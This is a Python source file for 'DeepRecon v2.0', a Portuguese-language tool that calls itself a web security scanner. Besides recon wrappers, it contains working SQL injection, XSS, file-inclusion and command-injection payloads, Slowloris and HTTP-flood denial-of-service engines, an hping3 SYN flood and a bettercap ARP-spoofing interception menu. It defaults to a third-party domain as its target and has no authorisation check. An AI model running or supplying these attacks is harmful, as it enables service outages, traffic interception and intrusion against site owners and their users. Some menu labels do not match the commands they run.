#!/usr/bin/env python3
"""
DeepRecon v2.0 - Web Security Scanner
Python rewrite with modern features:
  - try/except error handling
  - Process timeout + monitor + Ctrl+C
  - Built-in Python attacks (SQLi, XSS, LFI, RCE)
  - Python DDoS (Slowloris, HTTP Flood)
  - Nuclei + HTTPX integration
  - Joguin IA heuristic analysis
  - HTML/JSON reports
"""

import sys, os, socket, json, time, subprocess, threading, urllib.request, urllib.error, urllib.parse, shutil, glob, re, signal
from urllib.parse import urlparse
from datetime import datetime
from pathlib import Path
import http.client, ssl

# ──────────────────────────────────────────────
# CORES
# ──────────────────────────────────────────────
RED = "\033[91m"; GREEN = "\033[92m"; YELLOW = "\033[93m"
BLUE = "\033[94m"; CYAN = "\033[96m"; MAGENTA = "\033[95m"
WHITE = "\033[97m"; BOLD = "\033[1m"; END = "\033[0m"

SCRIPT_DIR = Path(__file__).parent.resolve()
REPORTS_DIR = SCRIPT_DIR / "reports"

# ──────────────────────────────────────────────
# UTILITÁRIOS
# ──────────────────────────────────────────────
def color(s, c): return f"{c}{s}{END}"
def bold(s): return f"{BOLD}{s}{END}"
def info(msg): print(f"  {BLUE}[i] {msg}{END}")
def ok(msg): print(f"  {GREEN}[+] {msg}{END}")
def warn(msg): print(f"  {YELLOW}[!] {msg}{END}")
def err(msg): print(f"  {RED}[-] {msg}{END}")
def vuln(msg, sev="HIGH"):
    c = {"CRITICAL": RED, "HIGH": YELLOW, "MEDIUM": BLUE, "LOW": WHITE}.get(sev, YELLOW)
    print(f"  {c}[{sev}] {msg}{END}")

def get_input(prompt, default=""):
    try:
        r = input(f"  {CYAN}[?] {prompt}{END} ").strip()
        return r if r else default
    except (EOFError, KeyboardInterrupt):
        return default

def carregar_env():
    for envf in [SCRIPT_DIR/".env", Path.home()/".config/deeprecon/.env"]:
        if envf.exists():
            for line in envf.read_text().splitlines():
                line = line.strip()
                if line and not line.startswith("#") and "=" in line:
                    k, v = line.split("=", 1)
                    os.environ[k.strip()] = v.strip()

def check_tool(name):
    try:
        r = subprocess.run(["which", name], capture_output=True, timeout=5)
        return r.returncode == 0
    except: return False

# ──────────────────────────────────────────────
# MONITOR DE PROCESSO (timeout + kill + idle)
# ──────────────────────────────────────────────
class ToolMonitor:
    def __init__(self, timeout=120, verbose=False):
        self.timeout = timeout
        self.verbose = verbose
        self._proc = None
        self._cancel = False

    def run(self, cmd, label="", shell=True, timeout=None):
        if timeout is None: timeout = self.timeout
        if self.verbose: info(f"CMD: {cmd}")
        info(f"{label} ({timeout}s timeout)")
        self._cancel = False
        output = []
        last_out = time.time()
        try:
            self._proc = subprocess.Popen(
                cmd if isinstance(cmd, list) else cmd,
                shell=isinstance(cmd, str),
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, preexec_fn=lambda: signal.signal(signal.SIGINT, signal.SIG_IGN)
            )
            start = time.time()
            for line in self._proc.stdout:
                if self._cancel: break
                if line.strip():
                    output.append(line.rstrip())
                    if self.verbose: print(f"   {line.rstrip()}")
                    last_out = time.time()
                if time.time() - start > timeout:
                    warn(f"Timeout ({timeout}s) - parando {label}")
                    self._proc.terminate()
                    try: self._proc.wait(timeout=5)
                    except: self._proc.kill()
                    return False, output
                if time.time() - last_out > 15 and time.time() - start > 20:
                    warn(f"Sem output ha {int(time.time()-last_out)}s...")
                    last_out = time.time()
            self._proc.wait()
            return self._proc.returncode == 0, output
        except KeyboardInterrupt:
            warn(f"Cancelado: {label}")
            if self._proc:
                self._proc.terminate()
                try: self._proc.wait(timeout=3)
                except: self._proc.kill()
            self._cancel = True
            return False, output
        except Exception as e:
            err(f"Erro em {label}: {e}")
            return False, output

# ──────────────────────────────────────────────
# ATAQUES PYTHON NATIVOS
# ──────────────────────────────────────────────
class AttackEngine:
    def __init__(self, target_url, hostname, verbose=False):
        self.url = target_url.rstrip("/")
        self.hostname = hostname
        self.verbose = verbose
        self.findings = []

    def _request(self, url, timeout=5):
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 (DeepRecon/2.0)"})
            resp = urllib.request.urlopen(req, timeout=timeout)
            return resp.read().decode("utf-8", errors="ignore"), resp.status
        except: return "", 0

    def sqli(self):
        warn("SQL Injection (Python)")
        payloads = ["' OR '1'='1", "' OR 1=1 --", "admin'--", "' UNION SELECT 1--", "\" OR 1=1--"]
        params = ["id", "page", "cat", "user", "search", "q", "prod", "cod"]
        for param in params:
            for payload in payloads:
                if self.verbose: print(f"   {param}={payload[:20]}")
                content, _ = self._request(f"{self.url}?{param}={urllib.parse.quote(payload)}")
                if any(x in content.lower() for x in ["sql syntax", "mysql_fetch", "database error", "ORA-",
                    "unclosed", "quotename", "syntax error", "mysql", "odbc"]):
                    vuln(f"SQLi em {param} com {payload[:20]}", "CRITICAL")
                    self.findings.append(("SQLi", f"SQL Injection em {param}", "CRITICAL"))
                    break

    def xss(self):
        warn("XSS (Python)")
        payloads = ["<script>alert(1)</script>", "'\"><script>alert(1)</script>",
                     "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>"]
        params = ["q", "search", "query", "id", "page", "name", "comment", "s"]
        for param in params:
            for payload in payloads:
                if self.verbose: print(f"   {param}={payload[:20]}")
                content, _ = self._request(f"{self.url}?{param}={urllib.parse.quote(payload)}")
                if payload in content or urllib.parse.quote(payload) in content:
                    vuln(f"XSS refletido em {param}", "CRITICAL")
                    self.findings.append(("XSS", f"XSS em {param}", "CRITICAL"))
                    break

    def lfi(self):
        warn("LFI (Python)")
        payloads = ["../../../../etc/passwd", "../../../etc/passwd",
                     "php://filter/convert.base64-encode/resource=index",
                     "....//....//....//etc/passwd"]
        params = ["file", "page", "dir", "path", "document", "include", "load"]
        for param in params:
            for payload in payloads:
                if self.verbose: print(f"   {param}={payload[:25]}")
                content, _ = self._request(f"{self.url}?{param}={urllib.parse.quote(payload)}")
                if "root:" in content and ("/bin/bash" in content or "/bin/sh" in content):
                    vuln(f"LFI em {param}", "CRITICAL")
                    self.findings.append(("LFI", f"LFI em {param}", "CRITICAL"))
                    break

    def rce(self):
        warn("RCE (Python)")
        payloads = [";id", "|id", "`id`", "$(id)", ";cat /etc/passwd", "|cat /etc/passwd"]
        params = ["cmd", "command", "exec", "run", "ping", "host", "ip"]
        for param in params:
            for payload in payloads:
                if self.verbose: print(f"   {param}={payload[:15]}")
                content, _ = self._request(f"{self.url}?{param}={urllib.parse.quote(payload)}")
                if any(x in content for x in ["uid=", "gid=", "root:", "Linux"]):
                    vuln(f"RCE em {param}", "CRITICAL")
                    self.findings.append(("RCE", f"RCE em {param}", "CRITICAL"))
                    break

    def run_all(self):
        self.sqli(); self.xss(); self.lfi(); self.rce()
        return self.findings

# ──────────────────────────────────────────────
# DDoS EM PYTHON PURO
# ──────────────────────────────────────────────
class DDoSEngine:
    @staticmethod
    def slowloris(hostname, port=80, duration=30, threads=100):
        warn(f"Slowloris DDoS {hostname}:{port} ({duration}s)")
        killed = 0; lock = threading.Lock()
        start = time.time()
        def worker():
            nonlocal killed
            while time.time() - start < duration:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    sock.connect((hostname, port))
                    sock.send(f"GET / HTTP/1.1\r\nHost: {hostname}\r\n".encode())
                    time.sleep(9)
                    sock.close()
                    with lock: killed += 1
                except: pass
        workers = [threading.Thread(target=worker) for _ in range(threads)]
        for w in workers: w.start()
        time.sleep(duration)
        for w in workers: w.join(timeout=3)
        ok(f"Slowloris finalizado: {killed} conexoes")

    @staticmethod
    def http_flood(target_url, duration=30, threads=200):
        warn(f"HTTP Flood {target_url} ({duration}s)")
        count = 0; lock = threading.Lock()
        start = time.time()
        def worker():
            nonlocal count
            while time.time() - start < duration:
                try:
                    req = urllib.request.Request(target_url, headers={"User-Agent": "Mozilla/5.0"})
                    urllib.request.urlopen(req, timeout=3)
                    with lock: count += 1
                except: pass
        workers = [threading.Thread(target=worker) for _ in range(threads)]
        for w in workers: w.start()
        time.sleep(duration)
        for w in workers: w.join(timeout=3)
        ok(f"HTTP Flood: {count} requests")

# ──────────────────────────────────────────────
# JOGUIN IA
# ──────────────────────────────────────────────
class IAAnalyzer:
    def __init__(self, findings, techs, headers, portas):
        self.findings = findings
        self.techs = techs
        self.headers = headers
        self.portas = portas

    def analyze(self):
        criticos = sum(1 for f in self.findings if f[2] == "CRITICAL" or f[2] == "ALTO")
        alertas = sum(1 for f in self.findings if f[2] not in ("CRITICAL", "ALTO"))
        total = len(self.findings)

        score = min(100, total * 7)
        if criticos > 2: score = min(100, score + 20)
        if criticos > 5: score = min(100, score + 15)

        nivel = "BAIXO"
        if score >= 70: nivel = "CRITICO"
        elif score >= 50: nivel = "ALTO"
        elif score >= 25: nivel = "MEDIO"

        cats = {
            "Execucao de Codigo": 0, "Vazamento de Dados": 0,
            "Controle de Acesso": 0, "Configuracao": 0, "Criptografia": 0
        }
        for f in self.findings:
            desc = f[1].upper()
            if any(x in desc for x in ["RCE", "SQLI", "COMMAND", "UPLOAD", "WEBSHELL"]):
                cats["Execucao de Codigo"] += 15
            if any(x in desc for x in ["GIT", ".ENV", "BACKUP", "VAZAMENTO", "DUMP"]):
                cats["Vazamento de Dados"] += 15
            if any(x in desc for x in ["ACESSO LIVRE", "ADMIN", "CREDENTIAL", "LOGIN"]):
                cats["Controle de Acesso"] += 15
            if any(x in desc for x in ["HEADER", "HSTS", "CSP", "X-FRAME", "INFO", "SERVER"]):
                cats["Configuracao"] += 10
            if any(x in desc for x in ["SSL", "HTTPS", "CERTIFICATE", "CIPHER"]):
                cats["Criptografia"] += 10

        narrativa = []
        if cats["Execucao de Codigo"] > 20:
            narrativa.append("explorar SQLi/RCE para executar comandos no servidor")
        if cats["Vazamento de Dados"] > 15:
            narrativa.append("extrair dados sensiveis de arquivos expostos (.git, .env, backups)")
        if cats["Controle de Acesso"] > 10:
            narrativa.append("acessar paineis administrativos sem autenticacao")
        if cats["Configuracao"] > 15:
            narrativa.append("explorar configs incorretas (headers, info泄露)")

        return {
            "score": score, "nivel": nivel, "criticos": criticos,
            "alertas": alertas - criticos, "total": total,
            "categorias": cats, "narrativa": narrativa,
            "techs": self.techs
        }

    def print_report(self, result):
        print(f"\n  {RED}{BOLD}{'='*60}{END}")
        print(f"  {RED}{BOLD}        JOGUIN IA - Analise Heuristica{END}")
        print(f"  {RED}{BOLD}{'='*60}{END}")
        nivel_cor = {"CRITICO": RED, "ALTO": YELLOW, "MEDIO": BLUE, "BAIXO": GREEN}.get(result["nivel"], WHITE)
        print(f"\n  {WHITE}Score: {nivel_cor}{result['score']}% - {result['nivel']}{END}")
        print(f"  {WHITE}Achados: {result['criticos']} criticos, {result['alertas']} alertas{END}")

        if result["narrativa"]:
            print(f"\n  {YELLOW}Cadeias de ataque:{END}")
            for i, n in enumerate(result["narrativa"], 1):
                print(f"    {i}. {n}")

        print(f"\n  {YELLOW}Decomposicao por categoria:{END}")
        for cat, val in result["categorias"].items():
            bar = "#" * min(val, 30)
            print(f"    [{bar.ljust(30)}] {min(val, 100)}% - {cat}")

        if result["techs"]:
            print(f"\n  {BLUE}Tecnologias detectadas: {', '.join(result['techs'])}{END}")

# ──────────────────────────────────────────────
# RELATÓRIO HTML
# ──────────────────────────────────────────────
class ReportEngine:
    @staticmethod
    def generate_json(scan_data, path):
        with open(path, "w") as f:
            json.dump(scan_data, f, indent=2, default=str)
        ok(f"JSON: {path}")

    @staticmethod
    def generate_html(scan_data, path):
        nivel = scan_data.get("nivel", "BAIXO")
        score = scan_data.get("score", 0)
        cor = {"CRITICO": "#dc3545", "ALTO": "#fd7e14", "MEDIO": "#ffc107", "BAIXO": "#28a745"}.get(nivel, "#28a745")
        criticos = scan_data.get("criticos", 0)
        alertas = scan_data.get("alertas", 0)
        total = criticos + alertas

        rows = ""
        for f in scan_data.get("findings", []):
            sev = f[2]
            desc = f[1]
            sev_class = "CRITICO" if sev in ("CRITICAL", "CRITICO") else "ALERTA"
            rows += f'<tr class="sev_{sev_class}"><td><span class="badge {sev_class}">{sev_class}</span></td><td>{desc}</td></tr>\n'

        html = f"""<!DOCTYPE html><html lang="pt-BR"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>DeepRecon - {scan_data.get("dominio", "")}</title>
<style>
*{{box-sizing:border-box;margin:0;padding:0}}
body{{font-family:'Segoe UI',sans-serif;background:#0a0e17;color:#e0e0e0;padding:20px}}
h1{{color:#00d4ff;font-size:1.8em;margin-bottom:20px}}
h2{{color:#8892b0;font-size:1.2em;margin-bottom:10px}}
.card{{background:#12162a;border:1px solid #1e2745;border-radius:10px;padding:20px;margin:10px 0}}
.grid{{display:grid;grid-template-columns:repeat(auto-fit,minmax(140px,1fr));gap:10px}}
.stat{{text-align:center;padding:10px;border-radius:8px;background:#0d1117}}
.stat .num{{font-size:2em;font-weight:bold}}
.stat .lbl{{font-size:.8em;color:#8892b0;margin-top:4px}}
.stat.crit .num{{color:#dc3545}}
.stat.alert .num{{color:#ffc107}}
.stat.score .num{{color:{cor}}}
.bar{{background:#0d1117;border-radius:8px;height:28px;overflow:hidden;margin:10px 0}}
.bar-fill{{height:100%;text-align:center;line-height:28px;color:#fff;font-weight:bold;background:{cor};width:{score}%}}
table{{width:100%;border-collapse:collapse;font-size:.9em}}
th{{text-align:left;color:#8892b0;border-bottom:2px solid #1e2745;padding:10px 8px}}
td{{border-bottom:1px solid #1a1f33;padding:8px;vertical-align:top}}
tr:hover{{background:#1a1f33}}
.badge{{display:inline-block;padding:2px 8px;border-radius:4px;font-size:.8em;font-weight:bold}}
.badge.CRITICO{{background:#dc354522;color:#dc3545;border:1px solid #dc3545}}
.badge.ALERTA{{background:#ffc10722;color:#ffc107;border:1px solid #ffc107}}
footer{{text-align:center;color:#555;font-size:.8em;margin-top:30px;padding:20px}}
</style></head><body>
<h1>🔍 DeepRecon - Relatorio de Seguranca</h1>
<div class="card">
  <div class="grid">
    <div class="stat"><div class="num">{scan_data.get("dominio", "")}</div><div class="lbl">Dominio</div></div>
    <div class="stat"><div class="num">{scan_data.get("data", "")}</div><div class="lbl">Data</div></div>
    <div class="stat score"><div class="num">{score}%</div><div class="lbl">{nivel}</div></div>
  </div>
</div>
<div class="card">
  <h2>📊 Resumo</h2>
  <div class="grid">
    <div class="stat crit"><div class="num">{criticos}</div><div class="lbl">Criticos</div></div>
    <div class="stat alert"><div class="num">{alertas}</div><div class="lbl">Alertas</div></div>
    <div class="stat"><div class="num">{total}</div><div class="lbl">Total</div></div>
  </div>
  <div class="bar"><div class="bar-fill">{score}%</div></div>
</div>
<div class="card">
  <h2>🔎 Achados</h2>
  <table><thead><tr><th>Severidade</th><th>Descricao</th></tr></thead><tbody>
  {rows}
  </tbody></table>
</div>
<footer>DeepRecon v2.0 | Gerado em {scan_data.get("data", "")}</footer>
</body></html>"""
        with open(path, "w") as f:
            f.write(html)
        ok(f"HTML: {path}")

# ──────────────────────────────────────────────
# DEEPRECON PRINCIPAL
# ──────────────────────────────────────────────
class DeepRecon:
    def __init__(self):
        self.targets = []
        self.current_target = None
        self.url = ""
        self.hostname = ""
        self.ip = ""
        self.headers = {}
        self.modo = "bruto"
        self.verbose = False
        self.timeout = 120
        self.findings = []
        self.techs = []
        self.output_dir = ""
        self.report_path = ""
        self.noise = 0
        self._running = True
        self._monitor = ToolMonitor(timeout=self.timeout, verbose=self.verbose)

    def banner(self):
        os.system("clear")
        print(f"""
{RED}{BOLD}╔══════════════════════════════════════════════════╗
║        DEEPRECON v2.0 - Scanner Web          ║
║           Python Edition                      ║
╚══════════════════════════════════════════════════╝{END}
""")

    def setup(self):
        carregar_env()
        self.banner()
        print(f"  {WHITE}{bold('CONFIGURACAO')}{END}\n")
        print("  [1] FURTIVO  - Recon passivo")
        print("  [2] MEDIO    - Scan moderado")
        print("  [3] BRUTO    - Scan completo")
        print("  [4] CUSTOM   - Escolha manual\n")
        choice = get_input("Modo (1-4)", "3")
        modos = {"1": ("furtivo", 1000), "2": ("medio", 300), "3": ("bruto", 100), "4": ("custom", 200)}
        self.modo, rate = modos.get(choice, ("bruto", 100))
        ok(f"Modo: {self.modo.upper()}")

        url = get_input("URL alvo (https://site.com)")
        if not url: url = "http://toyrus.net"
        self.targets = [url]
        ok(f"Alvo: {url}")

    def validate_target(self, url):
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        info(f"Validando: {url}")
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 (DeepRecon/2.0)"})
            resp = urllib.request.urlopen(req, timeout=10)
            self.url = url
            parsed = urlparse(url)
            self.hostname = parsed.hostname or ""
            try: self.ip = socket.gethostbyname(self.hostname)
            except: self.ip = self.hostname
            ok(f"Online ({resp.status}) - {self.hostname} ({self.ip})")
            self.headers = dict(resp.headers)
            return True
        except Exception as e:
            err(f"Inacessivel: {e}")
            return False

    def progresso(self, label, steps=1):
        self.noise += steps
        pct = min(100, int(self.noise * 100 / 50))
        bar = "#" * int(pct/2) + " " * (50 - int(pct/2))
        print(f"\n  [{pct}%] {label}")
        print(f"  Ruido: [{bar}] {pct}%")

    # ── SCAN STEPS ──

    def step_headers(self):
        self.progresso("Analisando headers de seguranca", 2)
        h = self.headers
        if "strict-transport-security" not in {k.lower() for k in h}:
            warn("Falta HSTS"); self.findings.append(("ALERTA", "Falta HSTS", "MEDIO"))
        if "x-frame-options" not in {k.lower() for k in h}:
            vuln("Falta X-Frame-Options - Clickjacking!", "HIGH")
            self.findings.append(("ALTO", "Falta X-Frame-Options - Clickjacking", "ALTO"))
        if "x-content-type-options" not in {k.lower() for k in h}:
            warn("Falta X-Content-Type-Options"); self.findings.append(("ALERTA", "Falta X-Content-Type-Options", "MEDIO"))
        if "content-security-policy" not in {k.lower() for k in h}:
            warn("Falta CSP"); self.findings.append(("ALERTA", "Falta CSP", "MEDIO"))
        if "x-xss-protection" not in {k.lower() for k in h}:
            warn("Falta X-XSS-Protection"); self.findings.append(("ALERTA", "Falta X-XSS-Protection", "MEDIO"))

    def step_waf(self):
        self.progresso("WAFW00F - Detectando firewall", 2)
        if check_tool("wafw00f"):
            ok, out = self._monitor.run(f"wafw00f {self.url}", "WAF", timeout=30)
            for line in out:
                if "behind" in line.lower():
                    vuln(f"WAF detectado: {line}", "HIGH")
                    self.findings.append(("ALTO", f"WAF detectado: {line}", "ALTO"))
        else:
            info("wafw00f nao instalado")

    def step_whatweb(self):
        self.progresso("WhatWeb - Identificando tecnologias", 2)
        if check_tool("whatweb"):
            ok, out = self._monitor.run(f"whatweb --color=never -a 1 {self.url}", "WhatWeb", timeout=30)
            for line in out:
                print(f"   {line}")
                for t in ["Nginx", "Apache", "IIS", "PHP", "Java", "Node", "WordPress",
                          "JQuery", "MySQL", "Python", "Django", "Ruby", "Rails"]:
                    if t.lower() in line.lower() and t not in self.techs:
                        self.techs.append(t)
            if self.techs: ok(f"Tecnologias: {', '.join(self.techs)}")

    def step_nmap(self):
        self.progresso("Nmap - Escaneando portas", 3)
        if check_tool("nmap"):
            ok, out = self._monitor.run(
                f"nmap --top-ports 100 -T4 --open -sV {self.hostname}",
                "Nmap", timeout=120
            )
            for line in out:
                if "/tcp" in line:
                    print(f"   {line}")
                    if "http" in line.lower() or "www" in line.lower() or "ssl/http" in line.lower():
                        if "http" not in self.techs: self.techs.append("HTTP")
        else:
            err("nmap nao instalado")

    def step_gobuster(self):
        self.progresso("Gobuster - Descobrindo diretorios", 2)
        if not check_tool("gobuster"):
            info("gobuster nao instalado"); return
        wl = "/usr/share/wordlists/dirb/common.txt"
        if not os.path.exists(wl):
            wl = "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
            if not os.path.exists(wl): return
        ok, out = self._monitor.run(
            f"gobuster dir -u {self.url} -w {wl} -t 20 -q -s 200,301,302,403,401",
            "Gobuster", timeout=90
        )
        found = [l for l in out if l.strip() and "Progress" not in l]
        for l in found[:15]:
            print(f"   {l}")

    def step_sensitive(self):
        self.progresso("Procurando arquivos sensiveis", 2)
        paths = ["admin", "login", "backup", "wp-admin", "config", ".git", ".env",
                 ".htaccess", ".svn", "phpinfo.php", "test.php", "info.php", "debug.php",
                 "console", "painel", "dashboard", "xmlrpc.php", "wp-config.php.bak",
                 "dump.sql", "database.sql", "server-status", "server-info", "crossdomain.xml"]
        for path in paths:
            try:
                url = f"{self.url.rstrip('/')}/{path}"
                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                resp = urllib.request.urlopen(req, timeout=3)
                if resp.status == 200:
                    content = resp.read().decode("utf-8", errors="ignore").lower()
                    if any(x in content for x in ["<html", "<body", "<form", "<div"]):
                        if path in ("admin", "login", "wp-admin", "painel", "dashboard", "console"):
                            vuln(f"ACESSO LIVRE: {url}", "HIGH")
                            self.findings.append(("ALTO", f"ACESSO LIVRE: {url}", "ALTO"))
                    elif path == ".git" and "[core]" in content:
                        vuln(f"GIT EXPOSTO: {url}", "CRITICAL")
                        self.findings.append(("CRITICO", f"REPOSITORIO GIT EXPOSTO: {url}", "CRITICAL"))
                    elif path == ".env" and any(x in content for x in ["db_", "app_", "secret", "password"]):
                        vuln(f".ENV EXPOSTO: {url}", "CRITICAL")
                        self.findings.append(("CRITICO", f".ENV EXPOSTO: {url}", "CRITICAL"))
                    elif path in ("phpinfo.php", "info.php", "test.php", "debug.php") and "php version" in content:
                        vuln(f"PHPINFO EXPOSTO: {url}", "HIGH")
                        self.findings.append(("ALTO", f"PHPINFO EXPOSTO: {url}", "ALTO"))
            except urllib.error.HTTPError as e:
                if e.code == 401:
                    info(f"Auth required: {url}")
            except: pass

    def step_nikto(self):
        self.progresso("Nikto - Varredura de vulnerabilidades", 2)
        if not check_tool("nikto"): return
        ok, out = self._monitor.run(
            f"nikto -h {self.url} -maxtime 60s -no404",
            "Nikto", timeout=70
        )
        vulns = [l for l in out if "+" in l or "OSVDB" in l]
        for v in vulns[:10]: print(f"   {v}")

    def step_nuclei(self):
        self.progresso("Nuclei - Templates CVE", 2)
        if not check_tool("nuclei"): return
        ok, out = self._monitor.run(
            f"nuclei -u {self.url} -t cves,vulnerabilities -severity critical,high -nc -silent",
            "Nuclei", timeout=90
        )
        for l in out[:15]:
            if l.strip():
                print(f"   {l}")
                self.findings.append(("ALTO", f"Nuclei: {l}", "ALTO"))

    def step_httpx(self):
        self.progresso("HTTPX - Probe", 1)
        if not check_tool("httpx"): return
        ok, out = self._monitor.run(
            f"httpx -u {self.url} -status-code -title -tech-detect -silent",
            "HTTPX", timeout=20
        )
        for l in out: print(f"   {l}")

    def step_attacks(self):
        self.progresso("Ataques Python (SQLi, XSS, LFI, RCE)", 3)
        engine = AttackEngine(self.url, self.hostname, self.verbose)
        findings = engine.run_all()
        for f in findings: self.findings.append(("CRITICO", f[1], "CRITICAL"))

    def step_database_scan(self):
        self.progresso("Database Scan", 1)
        db_ports = {"MySQL": 3306, "PostgreSQL": 5432, "MongoDB": 27017, "Redis": 6379, "Elasticsearch": 9200}
        found = []
        for name, port in db_ports.items():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                if sock.connect_ex((self.hostname, port)) == 0:
                    found.append(f"{name}:{port}")
                    vuln(f"{name} na porta {port}", "HIGH")
                    self.findings.append(("ALTO", f"{name} exposto na porta {port}", "ALTO"))
                sock.close()
            except: pass
        if not found: info("Nenhum DB exposto")

    def step_ssl(self):
        self.progresso("SSL/TLS Check", 2)
        if check_tool("sslscan"):
            ok, out = self._monitor.run(f"sslscan {self.hostname}", "SSLScan", timeout=45)
            weak = [l for l in out if "weak" in l.lower() or "rc4" in l.lower() or "3des" in l.lower() or "tlsv1.0" in l.lower()]
            for w in weak[:5]: print(f"   {w}")
        else:
            info("sslscan nao instalado, verificando via Python...")
            try:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
                conn = http.client.HTTPSConnection(self.hostname, timeout=10)
                conn.connect()
                cert = conn.sock.cipher()
                info(f"Cipher: {cert[0]}, Protocolo: {cert[1]}")
                conn.close()
            except Exception as e:
                warn(f"SSL check falhou: {e}")

    # ── ATTACK MENU ──

    def attack_menu(self):
        while True:
            print(f"\n  {RED}{BOLD}{'='*60}{END}")
            print(f"  {RED}{bold('MENU DE ATAQUE')}{END}")
            print(f"  {RED}{'='*60}{END}")
            print(f"  {BOLD}[1]{END} DDoS-Ripper")
            print(f"  {BOLD}[2]{END} Slowloris (Python puro)")
            print(f"  {BOLD}[3]{END} HTTP Flood (Python puro)")
            print(f"  {BOLD}[4]{END} SYN Flood (hping3)")
            print(f"  {BOLD}[5]{END} Bettercap - MITM")
            print(f"  {BOLD}[0]{END} Voltar\n")
            choice = get_input("Escolha", "0")
            if choice == "0": break
            elif choice == "1":
                if check_tool("hping3"):
                    dur = int(get_input("Duracao (s) [30]", "30"))
                    proc = subprocess.Popen(f"hping3 --flood --syn -p 80 {self.ip}", shell=True,
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    info(f"SYN Flood {self.ip} por {dur}s...")
                    try: time.sleep(dur)
                    except KeyboardInterrupt: pass
                    proc.terminate(); ok("Finalizado")
                else:
                    err("hping3 nao instalado")
            elif choice == "2":
                dur = int(get_input("Duracao (s) [30]", "30"))
                threads = int(get_input("Threads [100]", "100"))
                DDoSEngine.slowloris(self.hostname, 80, dur, threads)
            elif choice == "3":
                dur = int(get_input("Duracao (s) [30]", "30"))
                threads = int(get_input("Threads [200]", "200"))
                DDoSEngine.http_flood(self.url, dur, threads)
            elif choice == "4":
                if check_tool("hping3"):
                    dur = int(get_input("Duracao (s) [30]", "30"))
                    info(f"SYN Flood {self.ip} por {dur}s...")
                    try:
                        subprocess.run(f"hping3 --flood --syn -p 80 {self.ip}", shell=True,
                            timeout=dur)
                    except: pass
                    ok("Finalizado")
                else:
                    err("hping3 nao instalado")
            elif choice == "5":
                if check_tool("bettercap"):
                    info("Bettercap interativo (sudo)...")
                    subprocess.run(f"sudo bettercap -eval 'set arp.spoof.targets {self.ip}; arp.spoof on; net.sniff on'", shell=True)
                else:
                    err("bettercap nao instalado")

    # ── IA ANALYSIS ──

    def ia_analysis(self):
        self.progresso("Joguin IA - Analisando dados", 2)
        ia = IAAnalyzer(self.findings, self.techs, self.headers, [])
        result = ia.analyze()
        ia.print_report(result)
        return result

    # ── REPORTS ──

    def generate_reports(self, ia_result):
        today = datetime.now().strftime("%Y%m%d")
        now_str = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
        report_dir = REPORTS_DIR / today
        report_dir.mkdir(parents=True, exist_ok=True)
        base = report_dir / f"DeepRecon_{self.hostname}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"

        scan_data = {
            "dominio": self.hostname, "ip": self.ip, "url": self.url,
            "data": now_str, "modo": self.modo,
            "score": ia_result["score"], "nivel": ia_result["nivel"],
            "criticos": ia_result["criticos"],
            "alertas": ia_result["alertas"],
            "findings": self.findings,
            "techs": self.techs,
            "categorias": ia_result["categorias"]
        }

        # TXT
        txt_path = f"{base}.txt"
        with open(txt_path, "w") as f:
            f.write(f"DeepRecon v2.0 - Relatorio\n")
            f.write(f"Alvo: {self.url}\nDominio: {self.hostname}\nIP: {self.ip}\n")
            f.write(f"Data: {now_str}\nModo: {self.modo}\n")
            f.write(f"Score: {ia_result['score']}% - {ia_result['nivel']}\n")
            f.write(f"Achados: {len(self.findings)}\n\n")
            for sev, desc, _ in self.findings:
                f.write(f"[{sev}] {desc}\n")
        ok(f"TXT: {txt_path}")

        # JSON
        ReportEngine.generate_json(scan_data, f"{base}.json")

        # HTML
        ReportEngine.generate_html(scan_data, f"{base}.html")

    # ── RUN ──

    def run(self):
        try:
            self.setup()
            for url in self.targets:
                if not self.validate_target(url): continue
                self.banner()
                print(f"  {WHITE}Alvo: {self.url}{END}")
                print(f"  {WHITE}IP:   {self.ip}{END}")
                print(f"  {WHITE}Data: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}{END}\n")

                steps = [
                    self.step_waf, self.step_headers, self.step_whatweb,
                    self.step_ssl, self.step_nmap,
                ]
                if self.modo in ("bruto", "custom", "medio"):
                    steps += [self.step_gobuster, self.step_sensitive, self.step_attacks]

                if self.modo in ("bruto", "custom"):
                    steps += [self.step_nikto, self.step_nuclei, self.step_httpx, self.step_database_scan]

                for step in steps:
                    if not self._running: break
                    try: step()
                    except KeyboardInterrupt:
                        warn("Passo cancelado")
                        continue
                    except Exception as e:
                        err(f"Erro: {e}")
                        continue

                if not self._running: break

                # IA Analysis
                ia_result = self.ia_analysis()

                # Reports
                self.generate_reports(ia_result)

                # Attack Menu
                atk = get_input("Deseja iniciar ataque? (s/N)", "n")
                if atk.lower() == "s":
                    self.attack_menu()

            ok(f"Scan concluido!")

        except KeyboardInterrupt:
            print(f"\n  {RED}Interrompido pelo usuario{END}")
            if self._monitor._proc:
                self._monitor._proc.terminate()
        except Exception as e:
            err(f"Erro geral: {e}")
            import traceback; traceback.print_exc()

if __name__ == "__main__":
    scanner = DeepRecon()
    scanner.run()
